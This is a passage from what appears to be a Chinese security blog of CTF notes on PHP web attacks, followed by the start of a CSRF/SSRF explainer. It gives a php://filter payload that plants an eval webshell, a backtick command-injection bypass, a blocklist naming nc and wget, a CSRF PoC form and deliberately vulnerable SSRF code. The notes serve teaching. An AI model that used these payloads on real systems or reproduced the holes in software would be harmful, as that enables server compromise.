(打开aaa中的index.php)</span></span><br><span class="line">结果：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>，http:<span class="comment">//localhost/aaa/?p=222 (附带查询)</span></span><br><span class="line">结果：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;p=222&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/?p=222&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>，http:<span class="comment">//localhost/aaa/index.php?p=222&amp;q=333</span></span><br><span class="line">结果：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;p=222&amp;q=333&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/index.php?p=222&amp;q=333&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">由实例可知：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] 获取查询 语句，实例中可知，获取的是?后面的值</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>] 获取 http:<span class="comment">//localhost 后面的值，包括/</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>] 获取当前脚本的路径，如：index.php</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>] 当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure><ul><li><code>$_SERVER[&#39;argv&#39;]</code><ul><li><code>$argv</code>：传递给脚本的参数数组</li></ul></li><li>网页模式下：<br><code>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</code></li></ul><blockquote><p>CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去<br>继续判断query string是否为空，<br>如果不为空把通过+符号分割的字符串转换成php内部的zend_string，<br>然后再把这个zend_string复制到 arr 数组中去。</p></blockquote><h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><ul><li>储存全局作用域中的变量</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);<span class="comment">//$v1和$v2指向同一地址，此时$v1=$v2</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: v1=ctfshow&amp;v2=GLOBALS  //构成$GLOBALS</code></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><ul><li>返回由所有已定义变量所组成的数组</li><li>变量包括环境变量、服务器变量和用户定义的变量</li></ul><p><code>var_dump(get_defined_vars())</code></p><h2 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h2><ul><li>PHP变量命名规则：<br>只能包含：字母、数字、下划线<br>其中，只能以字母、下划线开头</li></ul><p><code>if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;</code></p><p>php变量命名不允许出现 .（点号）,需要绕过’CTF_SHOW.COM’</p><p>GET或POST方式传进去的变量名,会自动将<code>空格 + . [</code>转换为 _</p><p>特殊字符<code>[</code>, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了 因此：</p><p><code>CTF[SHOW.COM =&gt; CTF_SHOW.COM</code></p><h1 id="die-和exit-死亡绕过"><a href="#die-和exit-死亡绕过" class="headerlink" title="die()和exit()死亡绕过"></a>die()和exit()死亡绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>PHP在解码base64时，遇到不在其中的字符时，会选择跳过这些字符，将有效的字符重新组成字符串进行解码</p><p>由于死亡之exit中的代码，字符<code>&lt;、?、;、&gt;、</code>空格等字符不符合base64解码范围，最终解码符合要求的只有<code>phpexit</code>这7个字符，而base64在解码的时候，是4个字节一组，因此还少一个，所以我们将这一个添加上去</p><ul><li>base64编码绕过：</li></ul><p><code>?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>什么是变量覆盖？</p><ul><li>用我们的传参值替换程序原有的变量值</li></ul><p>常见场景：</p><blockquote><p>$$使用不当</p><p>extract()函数使用不当</p><p>parse_str()使用不当</p><p>import_request_variables()使用不当</p><p>开启全局变量</p><p>……</p></blockquote><h2 id="与foreach"><a href="#与foreach" class="headerlink" title="$$与foreach()"></a>$$与foreach()</h2><ul><li>$$就是将之前定义的变量的值重新定义新的变量</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=b</span><br><span class="line"><span class="variable">$b</span>=c</span><br><span class="line">    </span><br><span class="line"><span class="variable">$$a</span> = $(<span class="variable">$a</span>) = <span class="variable">$b</span> = c</span><br></pre></td></tr></table></figure><ul><li>foreach()：循环用于列举出集合中所有的元素（是集合不是数组）</li><li>addslashes()：使用反斜线引用字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>)<span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)&#123;</span><br><span class="line">        <span class="variable">$$_key</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">当我以get方式传入a=<span class="number">2</span>时，输出结果为<span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h2><ul><li>extract(array,extract_rules,prefix) ：将数组中的变量导入到当前的符号表<ul><li>array：必需的，规定要使用的数组</li><li>extract_rules：可有可无，如果为空，则默认为EXTR_OVERWRITE</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;Dog&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a=<span class="subst">$a</span>,\$b=<span class="subst">$b</span>,\$c=<span class="subst">$c</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">结果：<span class="variable">$a</span>=Cat,<span class="variable">$b</span>=Dog,<span class="variable">$c</span>=Horse</span><br></pre></td></tr></table></figure><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><ul><li>把查询字符串解析到变量中</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不建议这么用</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br></pre></td></tr></table></figure><ul><li>若要post参数，需加引号<br><code>v1=&#39;flag=0&#39;</code></li><li><code>parse_str(string $encoded_string [, array &amp;$result ])</code><ul><li>如果存在第二个变量，变量会以数组元素的形式存入到这个数组，作为替代</li></ul></li></ul><blockquote><p>经过parse_str($_SERVER[‘QUERY_STRING’]) ==&gt; $_POST[key1]=36d 数组形式<br>经过extract($_POST)==&gt; $key=36d</p></blockquote><h1 id="assert-断言"><a href="#assert-断言" class="headerlink" title="assert()断言"></a>assert()断言</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>() 断言：</span><br><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] )</span><br><span class="line">如果 assertion 是字符串，它将会被 <span class="title function_ invoke__">assert</span>() 当做 PHP 代码来执行</span><br><span class="line">可见，<span class="keyword">eval</span>和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加</span><br></pre></td></tr></table></figure><h1 id="gettext拓展"><a href="#gettext拓展" class="headerlink" title="gettext拓展"></a>gettext拓展</h1><p>在开启该拓展后 _() 等效于 gettext()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;phpinfo&quot;</span>); </span><br><span class="line">结果  phpinfo</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;phpinfo&quot;</span>); </span><br><span class="line">结果 phpinfo </span><br></pre></td></tr></table></figure><h1 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>套娃命令执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">get传参   F=`<span class="variable">$F</span> `;sleep <span class="number">3</span></span><br><span class="line">经过<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>)截取后 得到  `<span class="variable">$F</span> `;</span><br><span class="line">也就是会执行 <span class="keyword">eval</span>(<span class="string">&quot;`<span class="subst">$F</span> `;&quot;</span>);</span><br><span class="line">我们把原来的<span class="variable">$F</span>带进去</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``<span class="subst">$F</span> `;sleep 3`&quot;</span>); <span class="comment">//``是shell_exec()函数的缩写</span></span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br></pre></td></tr></table></figure><h1 id="nl、cp、mv、tee写文件"><a href="#nl、cp、mv、tee写文件" class="headerlink" title="nl、cp、mv、tee写文件"></a>nl、cp、mv、tee写文件</h1><p>在禁命令的时候没有限制写文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nl</span> flag.php&gt;1.txt</span><br><span class="line"><span class="built_in">cp</span> flag.php&gt;1.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php&gt;1.txt</span><br></pre></td></tr></table></figure><p>tee命令</p><ul><li>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</li><li><code>tee file1 file2</code>：复制文件</li><li><code>ls /|tee 1.txt</code>：命令输出</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF&amp;SSRF</title>
      <link href="/post/5905ffd4.html"/>
      <url>/post/5905ffd4.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h2><h3 id="CSRF解释"><a href="#CSRF解释" class="headerlink" title="CSRF解释"></a>CSRF解释</h3><ul><li>CSRF（Cross-site Request Forgery，跨站请求伪造）是一种针对网站的恶意利用。CSRF攻击可以利用用户已经登陆或已经授权的状态，伪造合法用户发出请求给受信任的网点，从而实现在未授权的情况下执行一些特权操作。</li></ul><h3 id="CSRF攻击流程"><a href="#CSRF攻击流程" class="headerlink" title="CSRF攻击流程"></a>CSRF攻击流程</h3><ol><li>用户浏览器登录站点A</li><li>登陆成功后，服务器向用户浏览器发送cookie</li><li>用户在没有登出网站A的情况下，访问攻击者B</li><li>攻击者B要求访问站点A，发出一个请求Request</li><li>根据在（4）中的要求，浏览器带着（2）步的cookie访问站点A</li></ol><h3 id="CSRF分类"><a href="#CSRF分类" class="headerlink" title="CSRF分类"></a>CSRF分类</h3><ol><li><p>CSRF(GET)型</p><p>get型主要是通过URL恶意链接诱导用户点击，当用户处于访问网站的过程中，同时用户又点击了这个链接，那么就会触发修改。比如当用户正在修改密码，比如修改的URL:/user.php?id=1&amp;password=11111，意思就是用户把密码修改为1111，若攻击者把URL修改为URL:/user.php?id=1&amp;password=123456789，然后通过<a href="https://so.csdn.net/so/search?q=%E7%A4%BE%E5%B7%A5&spm=1001.2101.3001.7020">社工</a>手段进行诱导点击我们修改后的链接，那么当用户访问这个链接后就会把密码修改为123456789。</p></li><li><p>CSRF(POST)型<br>同样是修改密码但是这次在URL中不会显示密码，而且是在post中，那么当攻击者对该网站进行抓包分析整个数据包的构造，然后把相关的内容修改为其他用户的相关参数，然后同样是诱导用户去点击我们精心准备的WEB界面，那么当点击的时候就会自动进行提交，使其密码再次修改。<br>例如pikachu上构建的数据内容：</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.10.150/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;boy&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;116266565656&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nba<span class="symbol">&amp;#32;</span>lakes&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kobe<span class="symbol">&amp;#64;</span>pikachu<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF是什么"><a href="#SSRF是什么" class="headerlink" title="SSRF是什么"></a>SSRF是什么</h2><blockquote><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p></blockquote><h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><blockquote><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p></blockquote><h2 id="产生SSRF漏洞的函数"><a href="#产生SSRF漏洞的函数" class="headerlink" title="产生SSRF漏洞的函数"></a>产生SSRF漏洞的函数</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><ul><li>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$img</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><ul><li>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, errstr, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">            &#125; </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><ul><li>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span 